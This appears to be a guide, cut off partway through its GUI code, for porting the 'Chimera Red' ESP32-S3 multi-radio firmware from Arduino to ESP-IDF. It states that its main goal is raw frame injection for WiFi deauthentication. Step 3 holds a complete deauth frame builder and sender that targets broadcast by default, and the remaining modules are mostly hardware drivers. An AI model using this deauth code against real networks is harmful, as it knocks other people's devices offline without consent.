# Chimera Red: Arduino to ESP-IDF Migration Guide

## Overview

This guide walks through converting the Chimera Red firmware from Arduino framework to pure ESP-IDF. The primary motivation is to unlock reliable `esp_wifi_80211_tx()` for deauthentication attacks, which is blocked/buggy in the Arduino wrapper.

**Estimated Time:** 4-8 hours  
**Difficulty:** Intermediate  
**Prerequisites:** Basic C knowledge, familiarity with ESP32

---

## Table of Contents

1. [Why Migrate?](#1-why-migrate)
2. [Project Structure](#2-project-structure)
3. [Step 1: Create ESP-IDF Project](#step-1-create-esp-idf-project)
4. [Step 2: Configure sdkconfig](#step-2-configure-sdkconfig)
5. [Step 3: Port WiFi & Deauth](#step-3-port-wifi--deauth)
6. [Step 4: Port Serial Communication](#step-4-port-serial-communication)
7. [Step 5: Port Display (TFT)](#step-5-port-display-tft)
8. [Step 6: Port BLE Scanner](#step-6-port-ble-scanner)
9. [Step 7: Port NFC (PN532)](#step-7-port-nfc-pn532)
10. [Step 8: Port Sub-GHz (CC1101)](#step-8-port-sub-ghz-cc1101)
11. [Step 9: Port GUI Controller](#step-9-port-gui-controller)
12. [Step 10: Port Button Input](#step-10-port-button-input)
13. [Building & Flashing](#building--flashing)
14. [Troubleshooting](#troubleshooting)

---

## 1. Why Migrate?

### Arduino Limitations
- `esp_wifi_80211_tx()` returns `ESP_ERR_INVALID_ARG` (258) when promiscuous mode is active
- Arduino WiFi wrapper maintains hidden state that conflicts with ESP-IDF calls
- Mixing Arduino and ESP-IDF WiFi calls causes `abort()`

### ESP-IDF Advantages
- Full control over WiFi driver state
- Proper raw frame injection support
- Better memory management
- Native FreeRTOS access
- Smaller binary size

---

## 2. Project Structure

### Current Arduino Structure
```
firmware/
├── platformio.ini
├── src/
│   ├── main.cpp
│   └── gui/
│       ├── GuiController.cpp
│       ├── GuiController.h
│       └── GuiCommon.h
```

### Target ESP-IDF Structure
```
firmware_idf/
├── CMakeLists.txt
├── sdkconfig.defaults
├── partitions.csv
├── main/
│   ├── CMakeLists.txt
│   ├── main.c                 # Entry point
│   ├── wifi_manager.c         # WiFi scanning, promiscuous, deauth
│   ├── wifi_manager.h
│   ├── ble_scanner.c          # BLE scanning
│   ├── ble_scanner.h
│   ├── serial_comm.c          # UART communication
│   ├── serial_comm.h
│   ├── display.c              # TFT driver
│   ├── display.h
│   ├── gui.c                  # GUI logic
│   ├── gui.h
│   ├── nfc_pn532.c            # NFC reader
│   ├── nfc_pn532.h
│   ├── subghz_cc1101.c        # Sub-GHz radio
│   ├── subghz_cc1101.h
│   └── buttons.c              # Button input
└── components/                 # Optional external components
    └── ...
```

---

## Step 1: Create ESP-IDF Project

### 1.1 Create Directory Structure

```bash
cd c:\Users\admin\GitHub-projects\esp32-c3\chimera_red
mkdir firmware_idf
cd firmware_idf
mkdir main
```

### 1.2 Create Root CMakeLists.txt

**File: `firmware_idf/CMakeLists.txt`**
```cmake
cmake_minimum_required(VERSION 3.16)

# Set target chip
set(IDF_TARGET esp32s3)

include($ENV{IDF_PATH}/tools/cmake/project.cmake)
project(chimera_red)
```

### 1.3 Create Main CMakeLists.txt

**File: `firmware_idf/main/CMakeLists.txt`**
```cmake
idf_component_register(
    SRCS 
        "main.c"
        "wifi_manager.c"
        "serial_comm.c"
        "display.c"
        "gui.c"
        "ble_scanner.c"
        "nfc_pn532.c"
        "subghz_cc1101.c"
        "buttons.c"
    INCLUDE_DIRS "."
    REQUIRES 
        driver
        esp_wifi
        nvs_flash
        esp_event
        bt
        esp_timer
)
```

### 1.4 Create Partition Table

**File: `firmware_idf/partitions.csv`**
```csv
# Name,   Type, SubType, Offset,  Size, Flags
nvs,      data, nvs,     0x9000,  0x5000,
phy_init, data, phy,     0xe000,  0x1000,
factory,  app,  factory, 0x10000, 0x300000,
```

---

## Step 2: Configure sdkconfig

### 2.1 Create sdkconfig.defaults

**File: `firmware_idf/sdkconfig.defaults`**
```ini
# Target
CONFIG_IDF_TARGET="esp32s3"

# WiFi - CRITICAL for raw TX
CONFIG_ESP_WIFI_STATIC_RX_BUFFER_NUM=16
CONFIG_ESP_WIFI_DYNAMIC_RX_BUFFER_NUM=32
CONFIG_ESP_WIFI_TX_BUFFER_TYPE=0
CONFIG_ESP_WIFI_DYNAMIC_TX_BUFFER_NUM=32
CONFIG_ESP_WIFI_AMPDU_TX_ENABLED=n
CONFIG_ESP_WIFI_AMPDU_RX_ENABLED=n
CONFIG_ESP_WIFI_NVS_ENABLED=y

# BLE - NimBLE
CONFIG_BT_ENABLED=y
CONFIG_BT_NIMBLE_ENABLED=y
CONFIG_BT_NIMBLE_MAX_CONNECTIONS=1

# Console/UART
CONFIG_ESP_CONSOLE_USB_SERIAL_JTAG=y

# Optimization
CONFIG_COMPILER_OPTIMIZATION_PERF=y

# Stack sizes
CONFIG_ESP_MAIN_TASK_STACK_SIZE=8192
CONFIG_ESP_SYSTEM_EVENT_TASK_STACK_SIZE=4096

# Disable watchdog for debugging (enable in production)
CONFIG_ESP_TASK_WDT=n
```

---

## Step 3: Port WiFi & Deauth

This is the **critical module** - the reason we're migrating.

### 3.1 Create wifi_manager.h

**File: `firmware_idf/main/wifi_manager.h`**
```c
#pragma once

#include "esp_wifi.h"
#include "esp_err.h"

// Initialize WiFi subsystem
esp_err_t wifi_manager_init(void);

// Scan for networks
esp_err_t wifi_scan_start(void);

// Start promiscuous mode for sniffing
esp_err_t wifi_sniffer_start(uint8_t channel);
esp_err_t wifi_sniffer_stop(void);

// Send deauthentication frame - THE GOAL
esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac, uint8_t channel);

// Set channel
esp_err_t wifi_set_channel(uint8_t channel);

// Callback type for captured packets
typedef void (*wifi_sniffer_cb_t)(void *buf, wifi_promiscuous_pkt_type_t type);
void wifi_set_sniffer_callback(wifi_sniffer_cb_t cb);
```

### 3.2 Create wifi_manager.c

**File: `firmware_idf/main/wifi_manager.c`**
```c
#include "wifi_manager.h"
#include "esp_log.h"
#include "esp_event.h"
#include "nvs_flash.h"
#include "string.h"

static const char *TAG = "wifi_mgr";

static wifi_sniffer_cb_t g_sniffer_cb = NULL;
static bool g_promiscuous_active = false;
static uint16_t g_deauth_seq = 0;

// Promiscuous RX callback
static void promisc_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (g_sniffer_cb) {
        g_sniffer_cb(buf, type);
    }
}

esp_err_t wifi_manager_init(void) {
    // Initialize NVS (required for WiFi)
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
        ESP_ERROR_CHECK(nvs_flash_erase());
        ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    // Initialize TCP/IP and event loop
    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_ap();

    // Initialize WiFi with default config
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    
    ESP_LOGI(TAG, "WiFi initialized");
    return ESP_OK;
}

esp_err_t wifi_scan_start(void) {
    // Stop any previous mode
    esp_wifi_stop();
    
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());
    
    wifi_scan_config_t scan_config = {
        .ssid = NULL,
        .bssid = NULL,
        .channel = 0,
        .show_hidden = true,
        .scan_type = WIFI_SCAN_TYPE_ACTIVE,
        .scan_time.active.min = 100,
        .scan_time.active.max = 300,
    };
    
    return esp_wifi_scan_start(&scan_config, false);
}

esp_err_t wifi_sniffer_start(uint8_t channel) {
    esp_wifi_stop();
    
    // Set AP mode (required for reliable TX)
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    
    // Configure hidden AP
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "chimera_sniff",
            .ssid_len = 13,
            .password = "dummy12345",
            .channel = channel,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .ssid_hidden = 1,
            .max_connection = 0,
            .beacon_interval = 60000,
        }
    };
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &ap_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    ESP_ERROR_CHECK(esp_wifi_set_ps(WIFI_PS_NONE));
    
    // Set channel
    ESP_ERROR_CHECK(esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE));
    
    // Enable promiscuous mode
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(promisc_rx_cb));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
    
    g_promiscuous_active = true;
    ESP_LOGI(TAG, "Sniffer started on channel %d", channel);
    return ESP_OK;
}

esp_err_t wifi_sniffer_stop(void) {
    esp_wifi_set_promiscuous(false);
    g_promiscuous_active = false;
    ESP_LOGI(TAG, "Sniffer stopped");
    return ESP_OK;
}

esp_err_t wifi_send_deauth(const uint8_t *target_mac, const uint8_t *ap_mac, uint8_t channel) {
    // Deauth frame structure
    uint8_t deauth_frame[26] = {
        0xC0, 0x00,                         // Frame Control (Deauth)
        0x00, 0x00,                         // Duration
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1 (RA) - Target
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2 (TA) - AP
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3 (BSSID)
        0x00, 0x00,                         // Sequence
        0x07, 0x00                          // Reason code 7 (Class 3 frame)
    };
    
    // Fill in addresses
    if (target_mac) {
        memcpy(deauth_frame + 4, target_mac, 6);
    }
    memcpy(deauth_frame + 10, ap_mac, 6);
    memcpy(deauth_frame + 16, ap_mac, 6);
    
    // Sequence number
    deauth_frame[22] = (g_deauth_seq & 0x0f) << 4;
    deauth_frame[23] = (g_deauth_seq & 0xff0) >> 4;
    g_deauth_seq++;
    if (g_deauth_seq > 0xfff) g_deauth_seq = 0;
    
    // CRITICAL: Disable promiscuous before TX
    bool was_promisc = g_promiscuous_active;
    if (was_promisc) {
        esp_wifi_set_promiscuous(false);
    }
    
    // Set channel
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    // Send frame - en_sys_seq=false for manual sequencing
    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
    
    // Restore promiscuous
    if (was_promisc) {
        esp_wifi_set_promiscuous(true);
    }
    
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "Deauth sent successfully");
    } else {
        ESP_LOGE(TAG, "Deauth failed: %d", ret);
    }
    
    return ret;
}

esp_err_t wifi_set_channel(uint8_t channel) {
    return esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
}

void wifi_set_sniffer_callback(wifi_sniffer_cb_t cb) {
    g_sniffer_cb = cb;
}
```

---

## Step 4: Port Serial Communication

### 4.1 Create serial_comm.h

**File: `firmware_idf/main/serial_comm.h`**
```c
#pragma once

#include "esp_err.h"
#include <stdint.h>

esp_err_t serial_init(void);
void serial_send_json(const char *type, const char *data);
void serial_send_raw(const uint8_t *data, size_t len);

// Command handler callback
typedef void (*serial_cmd_handler_t)(const char *cmd);
void serial_set_cmd_handler(serial_cmd_handler_t handler);
```

### 4.2 Create serial_comm.c

**File: `firmware_idf/main/serial_comm.c`**
```c
#include "serial_comm.h"
#include "driver/uart.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdio.h>

static const char *TAG = "serial";
#define UART_NUM UART_NUM_0
#define BUF_SIZE 1024

static serial_cmd_handler_t g_cmd_handler = NULL;
static char g_rx_buffer[BUF_SIZE];

static void serial_rx_task(void *arg) {
    int pos = 0;
    
    while (1) {
        uint8_t byte;
        int len = uart_read_bytes(UART_NUM, &byte, 1, portMAX_DELAY);
        
        if (len > 0) {
            if (byte == '\n' || byte == '\r') {
                if (pos > 0) {
                    g_rx_buffer[pos] = '\0';
                    if (g_cmd_handler) {
                        g_cmd_handler(g_rx_buffer);
                    }
                    pos = 0;
                }
            } else if (pos < BUF_SIZE - 1) {
                g_rx_buffer[pos++] = byte;
            }
        }
    }
}

esp_err_t serial_init(void) {
    uart_config_t uart_config = {
        .baud_rate = 115200,
        .data_bits = UART_DATA_8_BITS,
        .parity = UART_PARITY_DISABLE,
        .stop_bits = UART_STOP_BITS_1,
        .flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
    };
    
    ESP_ERROR_CHECK(uart_param_config(UART_NUM, &uart_config));
    ESP_ERROR_CHECK(uart_driver_install(UART_NUM, BUF_SIZE * 2, 0, 0, NULL, 0));
    
    xTaskCreate(serial_rx_task, "serial_rx", 4096, NULL, 10, NULL);
    
    ESP_LOGI(TAG, "Serial initialized");
    return ESP_OK;
}

void serial_send_json(const char *type, const char *data) {
    char buf[512];
    snprintf(buf, sizeof(buf), "{\"type\":\"%s\",\"data\":%s}\n", type, data);
    uart_write_bytes(UART_NUM, buf, strlen(buf));
}

void serial_send_raw(const uint8_t *data, size_t len) {
    uart_write_bytes(UART_NUM, (const char *)data, len);
}

void serial_set_cmd_handler(serial_cmd_handler_t handler) {
    g_cmd_handler = handler;
}
```

---

## Step 5: Port Display (TFT)

### 5.1 Create display.h

**File: `firmware_idf/main/display.h`**
```c
#pragma once

#include "esp_err.h"
#include <stdint.h>

// Pin definitions (match your wiring)
#define TFT_MOSI  7
#define TFT_SCLK  6
#define TFT_CS    15
#define TFT_DC    16
#define TFT_RST   17
#define TFT_BL    21

#define TFT_WIDTH  240
#define TFT_HEIGHT 320

// Colors (RGB565)
#define COLOR_BLACK   0x0000
#define COLOR_WHITE   0xFFFF
#define COLOR_RED     0xF800
#define COLOR_GREEN   0x07E0
#define COLOR_BLUE    0x001F
#define COLOR_YELLOW  0xFFE0
#define COLOR_CYAN    0x07FF

esp_err_t display_init(void);
void display_fill(uint16_t color);
void display_draw_pixel(int x, int y, uint16_t color);
void display_draw_rect(int x, int y, int w, int h, uint16_t color);
void display_fill_rect(int x, int y, int w, int h, uint16_t color);
void display_draw_text(int x, int y, const char *text, uint16_t color, uint16_t bg);
void display_set_backlight(bool on);
```

### 5.2 Create display.c (ST7789 Driver)

**File: `firmware_idf/main/display.c`**
```c
#include "display.h"
#include "driver/spi_master.h"
#include "driver/gpio.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "display";
static spi_device_handle_t g_spi;

// Basic 5x7 font (add full font data in production)
static const uint8_t font5x7[][5] = {
    {0x00,0x00,0x00,0x00,0x00}, // Space
    // ... add full ASCII font data
};

static void send_cmd(uint8_t cmd) {
    gpio_set_level(TFT_DC, 0);
    spi_transaction_t t = {
        .length = 8,
        .tx_buffer = &cmd,
    };
    spi_device_transmit(g_spi, &t);
}

static void send_data(const uint8_t *data, size_t len) {
    gpio_set_level(TFT_DC, 1);
    spi_transaction_t t = {
        .length = len * 8,
        .tx_buffer = data,
    };
    spi_device_transmit(g_spi, &t);
}

static void send_data_byte(uint8_t data) {
    send_data(&data, 1);
}

esp_err_t display_init(void) {
    // Configure GPIO pins
    gpio_config_t io_conf = {
        .pin_bit_mask = (1ULL << TFT_DC) | (1ULL << TFT_RST) | (1ULL << TFT_BL),
        .mode = GPIO_MODE_OUTPUT,
    };
    gpio_config(&io_conf);
    
    // SPI configuration
    spi_bus_config_t bus_cfg = {
        .mosi_io_num = TFT_MOSI,
        .miso_io_num = -1,
        .sclk_io_num = TFT_SCLK,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
        .max_transfer_sz = TFT_WIDTH * TFT_HEIGHT * 2,
    };
    ESP_ERROR_CHECK(spi_bus_initialize(SPI2_HOST, &bus_cfg, SPI_DMA_CH_AUTO));
    
    spi_device_interface_config_t dev_cfg = {
        .clock_speed_hz = 27 * 1000 * 1000,  // 27MHz
        .mode = 0,
        .spics_io_num = TFT_CS,
        .queue_size = 7,
    };
    ESP_ERROR_CHECK(spi_bus_add_device(SPI2_HOST, &dev_cfg, &g_spi));
    
    // Hardware reset
    gpio_set_level(TFT_RST, 0);
    vTaskDelay(pdMS_TO_TICKS(100));
    gpio_set_level(TFT_RST, 1);
    vTaskDelay(pdMS_TO_TICKS(100));
    
    // ST7789 initialization sequence
    send_cmd(0x01);  // Software reset
    vTaskDelay(pdMS_TO_TICKS(150));
    
    send_cmd(0x11);  // Sleep out
    vTaskDelay(pdMS_TO_TICKS(120));
    
    send_cmd(0x3A);  // Pixel format
    send_data_byte(0x55);  // 16-bit RGB565
    
    send_cmd(0x36);  // Memory access control
    send_data_byte(0x00);  // Normal orientation
    
    send_cmd(0x21);  // Inversion on (for some displays)
    
    send_cmd(0x29);  // Display on
    
    // Backlight on
    gpio_set_level(TFT_BL, 1);
    
    ESP_LOGI(TAG, "Display initialized");
    return ESP_OK;
}

static void set_window(int x0, int y0, int x1, int y1) {
    send_cmd(0x2A);  // Column address
    uint8_t col_data[] = {x0 >> 8, x0 & 0xFF, x1 >> 8, x1 & 0xFF};
    send_data(col_data, 4);
    
    send_cmd(0x2B);  // Row address
    uint8_t row_data[] = {y0 >> 8, y0 & 0xFF, y1 >> 8, y1 & 0xFF};
    send_data(row_data, 4);
    
    send_cmd(0x2C);  // Write to RAM
}

void display_fill(uint16_t color) {
    display_fill_rect(0, 0, TFT_WIDTH, TFT_HEIGHT, color);
}

void display_fill_rect(int x, int y, int w, int h, uint16_t color) {
    set_window(x, y, x + w - 1, y + h - 1);
    
    // Swap bytes for SPI
    uint8_t hi = color >> 8;
    uint8_t lo = color & 0xFF;
    
    size_t pixels = w * h;
    uint8_t *buf = malloc(pixels * 2);
    if (buf) {
        for (size_t i = 0; i < pixels; i++) {
            buf[i * 2] = hi;
            buf[i * 2 + 1] = lo;
        }
        send_data(buf, pixels * 2);
        free(buf);
    }
}

void display_draw_text(int x, int y, const char *text, uint16_t color, uint16_t bg) {
    // Simplified - implement with font rendering
    ESP_LOGI(TAG, "Text: %s at (%d,%d)", text, x, y);
}

void display_set_backlight(bool on) {
    gpio_set_level(TFT_BL, on ? 1 : 0);
}
```

---

## Step 6: Port BLE Scanner

### 6.1 Create ble_scanner.h

**File: `firmware_idf/main/ble_scanner.h`**
```c
#pragma once

#include "esp_err.h"
#include <stdint.h>

typedef struct {
    uint8_t addr[6];
    char name[32];
    int rssi;
} ble_device_t;

typedef void (*ble_scan_cb_t)(const ble_device_t *device);

esp_err_t ble_scanner_init(void);
esp_err_t ble_scan_start(ble_scan_cb_t callback);
esp_err_t ble_scan_stop(void);
```

### 6.2 Create ble_scanner.c

**File: `firmware_idf/main/ble_scanner.c`**
```c
#include "ble_scanner.h"
#include "esp_log.h"
#include "nimble/nimble_port.h"
#include "nimble/nimble_port_freertos.h"
#include "host/ble_hs.h"
#include "host/util/util.h"
#include "services/gap/ble_svc_gap.h"

static const char *TAG = "ble_scan";
static ble_scan_cb_t g_scan_cb = NULL;

static int ble_gap_event(struct ble_gap_event *event, void *arg) {
    switch (event->type) {
        case BLE_GAP_EVENT_DISC: {
            if (g_scan_cb) {
                ble_device_t dev = {0};
                memcpy(dev.addr, event->disc.addr.val, 6);
                dev.rssi = event->disc.rssi;
                
                // Extract name from advertisement data
                struct ble_hs_adv_fields fields;
                ble_hs_adv_parse_fields(&fields, event->disc.data, event->disc.length_data);
                if (fields.name != NULL && fields.name_len > 0) {
                    size_t len = fields.name_len < 31 ? fields.name_len : 31;
                    memcpy(dev.name, fields.name, len);
                }
                
                g_scan_cb(&dev);
            }
            break;
        }
        case BLE_GAP_EVENT_DISC_COMPLETE:
            ESP_LOGI(TAG, "Scan complete");
            break;
    }
    return 0;
}

static void ble_host_task(void *param) {
    nimble_port_run();
}

esp_err_t ble_scanner_init(void) {
    ESP_ERROR_CHECK(nimble_port_init());
    
    ble_hs_cfg.sync_cb = NULL;
    ble_hs_cfg.reset_cb = NULL;
    
    nimble_port_freertos_init(ble_host_task);
    
    ESP_LOGI(TAG, "BLE initialized");
    return ESP_OK;
}

esp_err_t ble_scan_start(ble_scan_cb_t callback) {
    g_scan_cb = callback;
    
    struct ble_gap_disc_params params = {
        .itvl = 0,
        .window = 0,
        .filter_policy = BLE_HCI_SCAN_FILT_NO_WL,
        .limited = 0,
        .passive = 0,
        .filter_duplicates = 1,
    };
    
    int rc = ble_gap_disc(BLE_OWN_ADDR_PUBLIC, 10000, &params, ble_gap_event, NULL);
    if (rc != 0) {
        ESP_LOGE(TAG, "Scan start failed: %d", rc);
        return ESP_FAIL;
    }
    
    ESP_LOGI(TAG, "BLE scan started");
    return ESP_OK;
}

esp_err_t ble_scan_stop(void) {
    ble_gap_disc_cancel();
    ESP_LOGI(TAG, "BLE scan stopped");
    return ESP_OK;
}
```

---

## Step 7: Port NFC (PN532)

### 7.1 Create nfc_pn532.h

**File: `firmware_idf/main/nfc_pn532.h`**
```c
#pragma once

#include "esp_err.h"
#include <stdint.h>

#define PN532_I2C_ADDR 0x24
#define PN532_SDA_PIN  48
#define PN532_SCL_PIN  8

esp_err_t pn532_init(void);
bool pn532_read_passive_target(uint8_t *uid, uint8_t *uid_len);
esp_err_t pn532_write_block(uint8_t block, const uint8_t *data);
```

### 7.2 Create nfc_pn532.c

**File: `firmware_idf/main/nfc_pn532.c`**
```c
#include "nfc_pn532.h"
#include "driver/i2c.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"

static const char *TAG = "pn532";
#define I2C_NUM I2C_NUM_0

// PN532 commands
#define PN532_COMMAND_GETFIRMWAREVERSION 0x02
#define PN532_COMMAND_SAMCONFIGURATION   0x14
#define PN532_COMMAND_INLISTPASSIVETARGET 0x4A

static esp_err_t i2c_write(const uint8_t *data, size_t len) {
    return i2c_master_write_to_device(I2C_NUM, PN532_I2C_ADDR, data, len, pdMS_TO_TICKS(1000));
}

static esp_err_t i2c_read(uint8_t *data, size_t len) {
    return i2c_master_read_from_device(I2C_NUM, PN532_I2C_ADDR, data, len, pdMS_TO_TICKS(1000));
}

static esp_err_t send_command(uint8_t cmd, const uint8_t *params, uint8_t params_len) {
    uint8_t buf[64];
    uint8_t len = params_len + 1;
    
    buf[0] = 0x00;  // Preamble
    buf[1] = 0x00;  // Start code 1
    buf[2] = 0xFF;  // Start code 2
    buf[3] = len + 1;  // Length
    buf[4] = ~(len + 1) + 1;  // LCS
    buf[5] = 0xD4;  // TFI (host to PN532)
    buf[6] = cmd;
    
    uint8_t checksum = 0xD4 + cmd;
    for (int i = 0; i < params_len; i++) {
        buf[7 + i] = params[i];
        checksum += params[i];
    }
    buf[7 + params_len] = ~checksum + 1;  // DCS
    buf[8 + params_len] = 0x00;  // Postamble
    
    return i2c_write(buf, 9 + params_len);
}

esp_err_t pn532_init(void) {
    // I2C configuration
    i2c_config_t conf = {
        .mode = I2C_MODE_MASTER,
        .sda_io_num = PN532_SDA_PIN,
        .scl_io_num = PN532_SCL_PIN,
        .sda_pullup_en = GPIO_PULLUP_ENABLE,
        .scl_pullup_en = GPIO_PULLUP_ENABLE,
        .master.clk_speed = 100000,
    };
    ESP_ERROR_CHECK(i2c_param_config(I2C_NUM, &conf));
    ESP_ERROR_CHECK(i2c_driver_install(I2C_NUM, conf.mode, 0, 0, 0));
    
    // SAM Configuration
    uint8_t sam_params[] = {0x01, 0x14, 0x01};  // Normal mode, timeout 1s, use IRQ
    esp_err_t ret = send_command(PN532_COMMAND_SAMCONFIGURATION, sam_params, 3);
    
    if (ret == ESP_OK) {
        ESP_LOGI(TAG, "PN532 initialized");
    } else {
        ESP_LOGW(TAG, "PN532 not found");
    }
    
    return ret;
}

bool pn532_read_passive_target(uint8_t *uid, uint8_t *uid_len) {
    uint8_t params[] = {0x01, 0x00};  // Max 1 target, 106 kbps type A
    send_command(PN532_COMMAND_INLISTPASSIVETARGET, params, 2);
    
    vTaskDelay(pdMS_TO_TICKS(100));
    
    uint8_t response[64];
    if (i2c_read(response, 20) == ESP_OK) {
        // Parse response
        // ... implementation
        return true;
    }
    
    return false;
}
```

---

## Step 8: Port Sub-GHz (CC1101)

### 8.1 Create subghz_cc1101.h

**File: `firmware_idf/main/subghz_cc1101.h`**
```c
#pragma once

#include "esp_err.h"
#include <stdint.h>

// SPI pins for CC1101
#define CC1101_MOSI  35
#define CC1101_MISO  37
#define CC1101_SCLK  36
#define CC1101_CS    5
#define CC1101_GDO0  4

esp_err_t cc1101_init(void);
esp_err_t cc1101_set_frequency(float freq_mhz);
esp_err_t cc1101_tx(const uint8_t *data, size_t len);
esp_err_t cc1101_rx_start(void);
int cc1101_rx_available(void);
size_t cc1101_rx_read(uint8_t *data, size_t max_len);
int cc1101_get_rssi(void);
```

### 8.2 Create subghz_cc1101.c

**File: `firmware_idf/main/subghz_cc1101.c`**
```c
#include "subghz_cc1101.h"
#include "driver/spi_master.h"
#include "driver/gpio.h"
#include "esp_log.h"

static const char *TAG = "cc1101";
static spi_device_handle_t g_spi;

// CC1101 registers
#define CC1101_IOCFG0   0x02
#define CC1101_FREQ2    0x0D
#define CC1101_FREQ1    0x0E
#define CC1101_FREQ0    0x0F
#define CC1101_SRES     0x30
#define CC1101_STX      0x35
#define CC1101_SRX      0x34
#define CC1101_SIDLE    0x36

static uint8_t spi_strobe(uint8_t cmd) {
    uint8_t rx;
    spi_transaction_t t = {
        .length = 8,
        .tx_buffer = &cmd,
        .rx_buffer = &rx,
    };
    spi_device_transmit(g_spi, &t);
    return rx;
}

static void spi_write_reg(uint8_t reg, uint8_t value) {
    uint8_t tx[2] = {reg, value};
    spi_transaction_t t = {
        .length = 16,
        .tx_buffer = tx,
    };
    spi_device_transmit(g_spi, &t);
}

static uint8_t spi_read_reg(uint8_t reg) {
    uint8_t tx[2] = {reg | 0x80, 0};
    uint8_t rx[2];
    spi_transaction_t t = {
        .length = 16,
        .tx_buffer = tx,
        .rx_buffer = rx,
    };
    spi_device_transmit(g_spi, &t);
    return rx[1];
}

esp_err_t cc1101_init(void) {
    // SPI bus configuration
    spi_bus_config_t bus_cfg = {
        .mosi_io_num = CC1101_MOSI,
        .miso_io_num = CC1101_MISO,
        .sclk_io_num = CC1101_SCLK,
        .quadwp_io_num = -1,
        .quadhd_io_num = -1,
    };
    ESP_ERROR_CHECK(spi_bus_initialize(SPI3_HOST, &bus_cfg, SPI_DMA_DISABLED));
    
    spi_device_interface_config_t dev_cfg = {
        .clock_speed_hz = 5 * 1000 * 1000,  // 5MHz
        .mode = 0,
        .spics_io_num = CC1101_CS,
        .queue_size = 3,
    };
    ESP_ERROR_CHECK(spi_bus_add_device(SPI3_HOST, &dev_cfg, &g_spi));
    
    // Reset CC1101
    spi_strobe(CC1101_SRES);
    vTaskDelay(pdMS_TO_TICKS(10));
    
    ESP_LOGI(TAG, "CC1101 initialized");
    return ESP_OK;
}

esp_err_t cc1101_set_frequency(float freq_mhz) {
    // Calculate frequency registers
    uint32_t freq = (uint32_t)(freq_mhz * 1000000.0f / 26000000.0f * 65536.0f);
    
    spi_strobe(CC1101_SIDLE);
    spi_write_reg(CC1101_FREQ2, (freq >> 16) & 0xFF);
    spi_write_reg(CC1101_FREQ1, (freq >> 8) & 0xFF);
    spi_write_reg(CC1101_FREQ0, freq & 0xFF);
    
    ESP_LOGI(TAG, "Frequency set to %.3f MHz", freq_mhz);
    return ESP_OK;
}

esp_err_t cc1101_tx(const uint8_t *data, size_t len) {
    // Write to TX FIFO and strobe TX
    // ... implementation
    spi_strobe(CC1101_STX);
    return ESP_OK;
}

esp_err_t cc1101_rx_start(void) {
    spi_strobe(CC1101_SRX);
    return ESP_OK;
}
```

---

## Step 9: Port GUI Controller

### 9.1 Create gui.h

**File: `firmware_idf/main/gui.h`**
```c
#pragma once

#include "esp_err.h"

typedef enum {
    SCREEN_HOME,
    SCREEN_WIFI,
    SCREEN_BLE,
    SCREEN_NFC,
    SCREEN_SUBGHZ,
    SCREEN_SETTINGS
} screen_t;

typedef enum {
    INPUT_NONE,
    INPUT_UP,
    INPUT_DOWN,
    INPUT_SELECT,
    INPUT_BACK
} input_t;

esp_err_t gui_init(void);
void gui_set_screen(screen_t screen);
void gui_handle_input(input_t input);
void gui_update(void);  // Call periodically
void gui_log(const char *msg);
```

### 9.2 Create gui.c

**File: `firmware_idf/main/gui.c`**
```c
#include "gui.h"
#include "display.h"
#include "esp_log.h"
#include <string.h>

static const char *TAG = "gui";

static screen_t g_current_screen = SCREEN_HOME;
static int g_selected_item = 0;
static char g_status_log[5][32] = {0};

static const char *menu_items[] = {
    "WiFi Scanner",
    "BLE Scanner", 
    "NFC Reader",
    "Sub-GHz",
    "Settings"
};
#define MENU_COUNT 5

esp_err_t gui_init(void) {
    display_init();
    display_fill(COLOR_BLACK);
    gui_set_screen(SCREEN_HOME);
    ESP_LOGI(TAG, "GUI initialized");
    return ESP_OK;
}

void gui_set_screen(screen_t screen) {
    g_current_screen = screen;
    display_fill(COLOR_BLACK);
    
    // Draw header
    display_fill_rect(0, 0, TFT_WIDTH, 30, COLOR_RED);
    display_draw_text(10, 8, "CHIMERA RED", COLOR_WHITE, COLOR_RED);
    
    switch (screen) {
        case SCREEN_HOME:
            for (int i = 0; i < MENU_COUNT; i++) {
                uint16_t bg = (i == g_selected_item) ? COLOR_CYAN : COLOR_BLACK;
